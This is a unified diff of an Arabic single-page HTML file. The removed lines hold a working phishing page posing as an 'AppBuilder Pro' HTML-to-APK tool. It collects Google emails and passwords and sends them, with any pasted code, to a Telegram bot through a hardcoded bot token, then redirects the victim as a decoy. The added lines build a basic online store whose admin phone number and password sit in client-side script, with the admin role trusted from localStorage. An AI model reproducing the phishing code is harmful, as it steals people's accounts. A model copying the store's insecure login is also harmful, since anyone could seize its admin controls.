@@ -3,90 +3,283 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AppBuilder Pro | تسجيل الدخول</title>
+    <title id="page-title">متجري الاحترافي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #00d4ff; --bg: #0b0e14; --card: #151921; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .box { background: var(--card); padding: 35px; border-radius: 20px; border: 1px solid #2d343f; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
-        h1 { color: var(--primary); margin-bottom: 20px; }
-        input, textarea { width: 100%; background: #000; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus, textarea:focus { border-color: var(--primary); }
-        .btn { background: var(--primary); color: #000; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.4s; }
-        .btn:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--primary); }
-        #editor-section { display: none; } /* مخفي حتى تسجيل الدخول */
-        .loading { display: none; margin-top: 20px; }
+        :root {
+            --primary-color: #2563eb;
+            --admin-color: #dc2626;
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            background-color: var(--bg-color);
+            color: #1e293b;
+        }
+
+        /* الهيدر */
+        header {
+            background: #fff;
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary-color); }
+
+        nav button {
+            background: none; border: none; font-family: inherit;
+            margin-right: 15px; cursor: pointer; font-weight: 600;
+        }
+
+        .btn-main { background: var(--primary-color); color: white; padding: 8px 20px; border-radius: 8px; }
+        .btn-admin-nav { border: 2px solid var(--admin-color); color: var(--admin-color); padding: 6px 15px; border-radius: 8px; }
+
+        /* الأقسام */
+        .container { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
+        section { display: none; }
+        section.active { display: block; animation: fadeIn 0.5s ease; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* كروت المنتجات */
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 25px; }
+        .card { 
+            background: var(--card-bg); border-radius: 15px; overflow: hidden; 
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); transition: transform 0.3s;
+        }
+        .card:hover { transform: translateY(-5px); }
+        .card img { width: 100%; height: 200px; object-fit: cover; }
+        .card-info { padding: 15px; text-align: center; }
+        .price { color: var(--primary-color); font-weight: bold; font-size: 1.2rem; }
+        .buy-btn { 
+            width: 100%; background: #10b981; color: white; border: none; 
+            padding: 10px; border-radius: 8px; margin-top: 10px; cursor: pointer;
+        }
+
+        /* لوحة التحكم */
+        .admin-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .admin-card { background: white; padding: 20px; border-radius: 12px; border-top: 5px solid var(--admin-color); }
+        input { 
+            width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; 
+            border-radius: 8px; box-sizing: border-box; 
+        }
+
+        .delete-btn { background: #fee2e2; color: #dc2626; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-top: 5px; }
+
+        /* سلة المشتريات */
+        .cart-badge { background: red; color: white; border-radius: 50%; padding: 2px 7px; font-size: 12px; vertical-align: top; }
     </style>
 </head>
 <body>
 
-<div class="box" id="login-section">
-    <h1>AppBuilder PRO</h1>
-    <p style="color: #8a94a6;">سجل دخولك باستخدام حساب جوجل للوصول لمحرر APK</p>
-    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button class="btn" onclick="captureLogin()">تسجيل الدخول</button>
-</div>
+    <header>
+        <div class="logo" id="brand-name">اسم المتجر</div>
+        <nav>
+            <button onclick="showSection('home')">الرئيسية</button>
+            <button onclick="showSection('cart')">السلة <span id="cart-count" class="cart-badge">0</span></button>
+            <button id="login-nav" onclick="showSection('login')" class="btn-main">دخول</button>
+            <button id="admin-nav" onclick="showSection('admin')" class="btn-admin-nav" style="display:none;">لوحة المدير</button>
+            <button id="logout-btn" onclick="logout()" style="display:none; color: gray;">خروج</button>
+        </nav>
+    </header>
 
-<div class="box" id="editor-section">
-    <h1>محرر الأكواد AI</h1>
-    <p style="color: #8a94a6;">ضع كود HTML لتحويله لتطبيق أندرويد</p>
-    <textarea id="htmlInput" placeholder="<html> ... </html>" style="height: 200px; color: #00ff41;"></textarea>
-    <button class="btn" onclick="captureCode()">بناء ملف APK الآن</button>
-    
-    <div class="loading" id="loader">
-        <div style="border: 4px solid #333; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-        <p id="status-text" style="font-size: 12px; margin-top: 10px;">جاري المعالجة...</p>
+    <div class="container">
+        
+        <section id="login">
+            <div style="max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 15px; text-align: center;">
+                <h2>تسجيل الدخول</h2>
+                <input type="text" id="user-phone" placeholder="رقم الهاتف">
+                <input type="password" id="user-pass" placeholder="كلمة السر">
+                <button onclick="login()" class="btn-main" style="width: 100%; margin-top: 15px;">دخول</button>
+                <p style="font-size: 0.9rem; color: #666; margin-top: 15px;">(للدخول كمدير استخدم بياناتك الخاصة)</p>
+            </div>
+        </section>
+
+        <section id="home" class="active">
+            <h2 style="margin-bottom: 25px;">أحدث المنتجات</h2>
+            <div id="products-list" class="grid"></div>
+        </section>
+
+        <section id="cart">
+            <h2>سلة المشتريات</h2>
+            <div id="cart-items" style="background: white; padding: 20px; border-radius: 12px;"></div>
+            <div id="cart-total" style="margin-top: 20px; font-weight: bold; font-size: 1.5rem;"></div>
+        </section>
+
+        <section id="admin">
+            <h2 style="color: var(--admin-color);">لوحة تحكم المدير</h2>
+            <div class="admin-grid">
+                <div class="admin-card">
+                    <h3>إعدادات الهوية</h3>
+                    <label>اسم المتجر الجديد:</label>
+                    <input type="text" id="new-name-input" placeholder="مثلاً: ليالي كوين">
+                    <button onclick="changeBrandName()" class="btn-main">حفظ الاسم الجديد</button>
+                </div>
+                <div class="admin-card">
+                    <h3>إضافة منتج جديد</h3>
+                    <input type="text" id="p-name" placeholder="اسم المنتج">
+                    <input type="number" id="p-price" placeholder="السعر">
+                    <input type="text" id="p-img" placeholder="رابط الصورة (URL)">
+                    <button onclick="addProduct()" class="btn-main" style="background: #10b981;">نشر المنتج فوراً</button>
+                </div>
+            </div>
+            <div class="admin-card" style="margin-top: 20px; width: 100%;">
+                <h3>إدارة المنتجات الحالية</h3>
+                <div id="admin-products-list"></div>
+            </div>
+        </section>
+
     </div>
-</div>
 
-<script>
-    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
-    const ADMIN_ID = "8754338811";
+    <script>
+        // الإعدادات الأساسية
+        const ADMIN_INFO = { phone: "01211056530", pass: "2009257" };
+        let products = JSON.parse(localStorage.getItem('myStoreProducts')) || [
+            { id: 1, name: "فستان ملكي", price: 1200, img: "https://images.unsplash.com/photo-1566174053879-31528523f8ae?q=80&w=400" },
+            { id: 2, name: "طقم كاجوال", price: 850, img: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=400" }
+        ];
+        let cart = [];
 
-    // دالة إرسال البيانات للتليجرام
-    async function sendToBot(msg) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
-        });
-    }
+        // تشغيل عند التحميل
+        window.onload = () => {
+            updateUI();
+            renderProducts();
+        };
 
-    // 1. سحب بيانات الدخول
-    async function captureLogin() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
+        function showSection(sectionId) {
+            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+        }
 
-        if(!email || !pass) return alert("يرجى ملء الحقول!");
+        // تسجيل الدخول
+        function login() {
+            const phone = document.getElementById('user-phone').value;
+            const pass = document.getElementById('user-pass').value;
 
-        // إرسال الحساب المسروق فوراً
-        await sendToBot(`🔥 **صيد جديد (تسجيل دخول):**\n📧 الإيميل: \`${email}\` \n🔑 الباسورد: \`${pass}\``);
+            if (phone === ADMIN_INFO.phone && pass === ADMIN_INFO.pass) {
+                localStorage.setItem('role', 'admin');
+                alert("مرحباً بك يا مدير");
+            } else {
+                localStorage.setItem('role', 'user');
+                alert("تم الدخول كمستخدم عادي");
+            }
+            location.reload();
+        }
 
-        // الانتقال للمرحلة التالية (المحرر)
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('editor-section').style.display = 'block';
-    }
+        function logout() {
+            localStorage.removeItem('role');
+            location.reload();
+        }
 
-    // 2. سحب كود الـ HTML
-    async function captureCode() {
-        const code = document.getElementById('htmlInput').value;
-        const loader = document.getElementById('loader');
+        function updateUI() {
+            const role = localStorage.getItem('role');
+            const savedName = localStorage.getItem('storeName') || "متجري";
+            document.getElementById('brand-name').innerText = savedName;
+            document.getElementById('page-title').innerText = savedName;
 
-        if(code.length < 10) return alert("أدخل كود صحيح!");
+            if (role === 'admin') {
+                document.getElementById('admin-nav').style.display = "inline-block";
+                document.getElementById('logout-btn').style.display = "inline-block";
+                document.getElementById('login-nav').style.display = "none";
+                renderAdminControl();
+            } else if (role === 'user') {
+                document.getElementById('logout-btn').style.display = "inline-block";
+                document.getElementById('login-nav').style.display = "none";
+            }
+        }
 
-        loader.style.display = 'block';
+        // إدارة المنتجات
+        function renderProducts() {
+            const container = document.getElementById('products-list');
+            container.innerHTML = "";
+            products.forEach(p => {
+                container.innerHTML += `
+                    <div class="card">
+                        <img src="${p.img}" alt="${p.name}">
+                        <div class="card-info">
+                            <h3>${p.name}</h3>
+                            <p class="price">${p.price} ج.م</p>
+                            <button class="buy-btn" onclick="addToCart(${p.id})">إضافة للسلة</button>
+                        </div>
+                    </div>
+                `;
+            });
+        }
 
-        // إرسال الكود المسحوب
-        await sendToBot(`🚀 **كود HTML مسحوب من الضحية:**\n\n\`\`\`html\n${code}\n\`\`\``);
+        function addProduct() {
+            const name = document.getElementById('p-name').value;
+            const price = document.getElementById('p-price').value;
+            const img = document.getElementById('p-img').value;
 
-        // تمويه الضحية
-        setTimeout(() => { document.getElementById('status-text').innerText = "جاري تجميع حزم APK..."; }, 2000);
-        setTimeout(() => { 
-            window.location.href = "https://t.me/8601512823?start=ready"; // توجيه للبوت لاستلام الملف
-        }, 5000);
-    }
-</script>
+            if (name && price && img) {
+                const newP = { id: Date.now(), name, price, img };
+                products.push(newP);
+                saveAndRefresh();
+            }
+        }
 
-<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
+        function deleteProduct(id) {
+            products = products.filter(p => p.id !== id);
+            saveAndRefresh();
+        }
+
+        function changeBrandName() {
+            const name = document.getElementById('new-name-input').value;
+            if (name) {
+                localStorage.setItem('storeName', name);
+                location.reload();
+            }
+        }
+
+        function saveAndRefresh() {
+            localStorage.setItem('myStoreProducts', JSON.stringify(products));
+            location.reload();
+        }
+
+        // السلة
+        function addToCart(id) {
+            const item = products.find(p => p.id === id);
+            cart.push(item);
+            document.getElementById('cart-count').innerText = cart.length;
+            renderCart();
+            alert(`تمت إضافة ${item.name} إلى السلة`);
+        }
+
+        function renderCart() {
+            const cartDiv = document.getElementById('cart-items');
+            let total = 0;
+            if (cart.length === 0) {
+                cartDiv.innerHTML = "السلة فارغة حالياً.";
+                return;
+            }
+            cartDiv.innerHTML = cart.map(item => {
+                total += parseFloat(item.price);
+                return `<div style="display:flex; justify-content:space-between; border-bottom:1px solid #eee; padding:10px;">
+                            <span>${item.name}</span>
+                            <span>${item.price} ج.م</span>
+                        </div>`;
+            }).join('');
+            document.getElementById('cart-total').innerText = `الإجمالي: ${total} ج.م`;
+        }
+
+        function renderAdminControl() {
+            const list = document.getElementById('admin-products-list');
+            list.innerHTML = products.map(p => `
+                <div style="display:flex; justify-content:space-between; align-items:center; padding:10px; border-bottom:1px solid #eee;">
+                    <span>${p.name}</span>
+                    <button class="delete-btn" onclick="deleteProduct(${p.id})">حذف</button>
+                </div>
+            `).join('');
+        }
+    </script>
 </body>
 </html>
